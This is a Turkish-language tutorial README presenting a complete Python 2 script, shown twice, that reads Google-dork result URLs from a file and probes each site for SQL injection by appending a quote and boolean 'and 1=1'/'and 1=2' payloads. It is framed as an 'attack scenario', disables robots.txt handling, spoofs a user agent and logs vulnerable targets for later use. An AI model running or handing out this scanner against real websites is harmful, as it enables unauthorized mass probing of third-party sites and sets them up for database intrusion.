🕊 Bu döküman [**@KekikAkademi**](https://t.me/KekikAkademi "Telegram: @KekikAkademi") için oluşturulmuştur. ✌🏼
________________________________
# Py4H SQL Injection Dedektör
![Py4H SQL Injection Dedektör](https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/10-Py4H-SQL-Injection-Dedektor/images/Py4H-SQL-Injection-Dedektor.png)

Merhaba arkadaşlar bu yazımızda  **Sql Injection**  zaafiyetini tespit etmek için ufak bir araç yapacağız. Daha önceki  [Google Searcher](https://github.com/KekikAkademi/KekikPython/tree/master/5-Py4H-Googler)  projemizde çıkan linkleri txt dosyasına kayıt etmiştik bu sefer txt dosyasındaki linkleri okuyarak sql injection açığı var mı yok mu bunu kontrol edeceğiz.

**Saldırı Senaryosu:**
X dorku ile bulduğumuz arama sonuçlarında çıkan her bir hedef linkte sql injection açığı için kontrol aşamalarından geçireceğiz. Tespit edilen linkler bize txt dosyasında sunulacak.

**Algoritma:**
1. Başla  
2. Link var ise al yok ise 5. adıma git  
3. Adim1() sql injection var ise yazdır 2. adıma git  
4. Adim2() sql injection var ise yazdır ve 2. adıma git  
5. Programı sonlandır

**Kod Paylaşımı: !!PYTHON 2!!**
İlk olarak genel ayarlarımızı yaptık her zamanki gibi. Bu sefer timeout süresinide değiştirdik çok beklemek istemeyiz çünkü.

	#! -*- coding: utf-8 -*-
	import mechanize,re,sys #kullanacağımız modülleri aktardık.
	br = mechanize.Browser() # tarayicimizi olusturduk..
	br.set_handle_robots(False) # robots.txt engellerini aşmak için false dedik
	br.addheaders = [('User-agent', 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)')] # header ekledik
	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 5 # timeout süresini belirledik

Bu kısımda standart birşey yaptık arkadaşlar. Aracımızı bir başkası kullandığı zaman nasıl kullanıldığı hakkında yardımcı olmak adına fonksiyonumuzu oluşturduk.

	def yardim(): #yardim fonksiyonumuz
		print "[!] Örnek kullanım:\n>> sql-i.py -i linkler.txt -o sonuclar.txt" # örnek kullanım..
		print "\n[+] = sql injection var demek!\n[?] = sql injection olabilir demek!\n[??] = blind sql injection olabilir demek!"

1.Adım dediğimiz kısım arkadaşlar. Herkesin yaptığı gibi en basit sql injection hatası var mı yok mu diyerek ‘a ifadesini koyduk linklerimizin sonuna..

	def Adim1(link): #Adım 1
		istek = br.open(link) # gelen linke istek gönderilir..
		kaynak_kod = istek.read() # açılan linkin  kaynak kodu alınır
		istek2 = br.open(link+"'a") # aynı linke 'a eklenerek 2. istek atılır 
		kaynak_kod2 = istek2.read() # açılan sitenin kaynak kodu 2. kez alınır
		if kaynak_kod != kaynak_kod2: # alınan 2 kaynak kod eşit değil ise 
			if re.findall('You have an error in your SQL',kaynak_kod2): # 2. aldığımız kaynak kodda şu cümle aranır
				print "[+] "+link # varsa ekrana yazdır
				dosya2.write(link+"\n") # ve dosyamıza yazdırırız
				pass # geç
			else: # 2.kaynak kod da sihirli sözcük yok ise
				print "[?] "+link # Sql injection olabilir denilir..
				dosya2.write(link+"\n") # ve dosyamıza yazdırırız
				pass # geç
		else: # eğer karşılaştırılan 2 kaynak kod da aynı ise
			Adim2(link) # Adım 2 ye gider linkimiz..

2.Adım dediğimiz bu kısımda eğer ‘a diyerek hata alamıyorsak mantıksal sorgu ile birde şansımızı 2. adımda deneyeceğiz arkadaşlar..

	def Adim2(link): # Adım 2
		#print "Adım 2 ye geçildi !!"
		istek3 = br.open(link+"+and+1=1") # linkimiz 3. istekde mantıksal sorgu ile tekrar açıldı
		kaynak_kod3 = istek3.read() # açılan sitenin kaynak kodu alındı
		istek4 = br.open(link+"+and+1=2") # 4. istekte yine ilk mantıksal sorguya ters bir mantık ile tekrar açıldı
		kaynak_kod4 = istek4.read() # açılan sitenin kaynak kodu alındı
		if kaynak_kod3 != kaynak_kod4: # kaynak kodlar karşılaştırıldı aynı değil ise !
			print "[??] "+link # Blind sql injection olabilir dendi..
			dosya2.write(link+"\n") # ve dosyamıza yazıldı
			pass # geç
		else: # kaynak kodlar aynı ise
			pass # geç

Ve son kısım arkadaşlar burası kodlarımızın beyni oluyor yani bütün iş burada dönüyor daha önceki fonksiyonlarımızı buradan çağırıyoruz gerekli hataları burada yok sayıyoruz(bypass).Bu kısımda açıklama satırlarında da okuyacağınız gibi txt den aldığımız linkleri gerekli fonksiyonumuza yollayarak yolculuğa çıkarıyoruz aynı zamanda bol bol hataları yok saymak adına try except metodunu kullanıyoruz.

	try: # Hatalar için try kullanıyoruz
		if sys.argv[1] == "-i" and sys.argv[3] == "-o": # argümanlarda -i ve -o var mı kontrol ettik eğer var ise
			i_dosya = sys.argv[2] # argümanlarımızı alıyoruz
			o_dosya = sys.argv[4] # argümanlarımızı alıyoruz
			dosya = open(i_dosya,"r") # dosyamızı okumak adına açtık
			kelimeler = dosya.read() # okuduk
			linkler = kelimeler.split("\n") # listemize aktardık split ile parçalayarak..
			dosya2 = open(o_dosya,"a") # 2. dosyamızı açtık üzerine eklemeli olarak yazmak için !		
			for a in linkler: # linklerimizi for döngüsünde döküyoruz
				try: # yine aynı şekil sitelerin güvenlik duvarlarının verdikleri cevaplardan programımızın hata vermemesi için try kullandık
					Adim1(a) # Adim 1 e linkimizi yolladık
				except:
					pass # Hata çıkarsa geç sıradaki linke 
			print "[+] İslem bitmistir.." # işlem bittiğinde
		else: # argümanlar yok ise
			yardim() # yardim fonksiyonunu göster kullanma kılavuzu
	except: # Hata çıkarsa
		yardim() # yardim fonksiyonumuzu göster..

Ve arkadaşlar projemizin sonuna gelmiş bulunmaktayız. Kodların hepsine aşşağıdan ulaşabilirsiniz.

	#! -*- coding: utf-8 -*-
	import mechanize,re,sys #kullanacağımız modülleri aktardık.
	br = mechanize.Browser() # tarayicimizi olusturduk..
	br.set_handle_robots(False) # robots.txt engellerini aşmak için false dedik
	br.addheaders = [('User-agent', 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)')] # header ekledik
	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 5 # timeout süresini belirledik

	def yardim(): #yardim fonksiyonumuz
		print "[!] Örnek kullanım:\n>> sql-i.py -i linkler.txt -o sonuclar.txt" # örnek kullanım..
		print "\n[+] = sql injection var demek!\n[?] = sql injection olabilir demek!\n[??] = blind sql injection olabilir demek!"
	def Adim2(link): # Adım 2
		#print "Adım 2 ye geçildi !!"
		istek3 = br.open(link+"+and+1=1") # linkimiz 3. istekde mantıksal sorgu ile tekrar açıldı
		kaynak_kod3 = istek3.read() # açılan sitenin kaynak kodu alındı
		istek4 = br.open(link+"+and+1=2") # 4. istekte yine ilk mantıksal sorguya ters bir mantık ile tekrar açıldı
		kaynak_kod4 = istek4.read() # açılan sitenin kaynak kodu alındı
		if kaynak_kod3 != kaynak_kod4: # kaynak kodlar karşılaştırıldı aynı değil ise !
			print "[??] "+link # Blind sql injection olabilir dendi..
			dosya2.write(link+"\n") # ve dosyamıza yazıldı
			pass # geç
		else: # kaynak kodlar aynı ise
			pass # geç
	def Adim1(link): #Adım 1
		istek = br.open(link) # gelen linke istek gönderilir..
		kaynak_kod = istek.read() # açılan linkin  kaynak kodu alınır
		istek2 = br.open(link+"'a") # aynı linke 'a eklenerek 2. istek atılır 
		kaynak_kod2 = istek2.read() # açılan sitenin kaynak kodu 2. kez alınır
		if kaynak_kod != kaynak_kod2: # alınan 2 kaynak kod eşit değil ise 
			if re.findall('You have an error in your SQL',kaynak_kod2): # 2. aldığımız kaynak kodda şu cümle aranır
				print "[+] "+link # varsa ekrana yazdır
				dosya2.write(link+"\n") # ve dosyamıza yazdırırız
				pass # geç
			else: # 2.kaynak kod da sihirli sözcük yok ise
				print "[?] "+link # Sql injection olabilir denilir..
				dosya2.write(link+"\n") # ve dosyamıza yazdırırız
				pass # geç
		else: # eğer karşılaştırılan 2 kaynak kod da aynı ise
			Adim2(link) # Adım 2 ye gider linkimiz..

	try: # Hatalar için try kullanıyoruz
		if sys.argv[1] == "-i" and sys.argv[3] == "-o": # argümanlarda -i ve -o var mı kontrol ettik eğer var ise
			i_dosya = sys.argv[2] # argümanlarımızı alıyoruz
			o_dosya = sys.argv[4] # argümanlarımızı alıyoruz
			dosya = open(i_dosya,"r") # dosyamızı okumak adına açtık
			kelimeler = dosya.read() # okuduk
			linkler = kelimeler.split("\n") # listemize aktardık split ile parçalayarak..
			dosya2 = open(o_dosya,"a") # 2. dosyamızı açtık üzerine eklemeli olarak yazmak için !		
			for a in linkler: # linklerimizi for döngüsünde döküyoruz
				try: # yine aynı şekil sitelerin güvenlik duvarlarının verdikleri cevaplardan programımızın hata vermemesi için try kullandık
					Adim1(a) # Adim 1 e linkimizi yolladık
				except:
					pass # Hata çıkarsa geç sıradaki linke 
			print "[+] İslem bitmistir.." # işlem bittiğinde
		else: # argümanlar yok ise
			yardim() # yardim fonksiyonunu göster kullanma kılavuzu
	except: # Hata çıkarsa
		yardim() # yardim fonksiyonumuzu göster..

Not: Projemiz Python 2.x sürümü ile kodlanmış olup en çok sevdiğim modüllerden birisi olan **mechanize** modülünü kullandık. Mechanize modülü, standart kütüphanelerde olmadığı için ayrıca yüklemeniz gerekmektedir.

[Kaynak](http://python4hackers.com/python-sql-injection-tools/py4h-sql-injection-dedektor.html "Saygı ve Özlemle..")
________________________________
📃 **Yandex.Disk Bünyemizde 900GB veri olmuştur.**

_Paylaşılan Kursların Tümünü_ [**@KekikKahve**](https://t.me/KekikKahve) _Grubu notlarından Çağırabilirsiniz.._

🕊️ Bize **oy verip** _paylaşarak_ destek olmaya ne dersin? ✌🏼
#
> Bu readme sayfası oluşturulurken [prose.io](http://prose.io/ "prose.io") ve [stackedit.io](https://stackedit.io/app "stackedit.io") araçlarından yardım alınmıştır..
> Emojiler için [webfx](https://www.webfx.com/tools/emoji-cheat-sheet/ "Emoji Cheat Sheet") sayfası kullanılmıştır.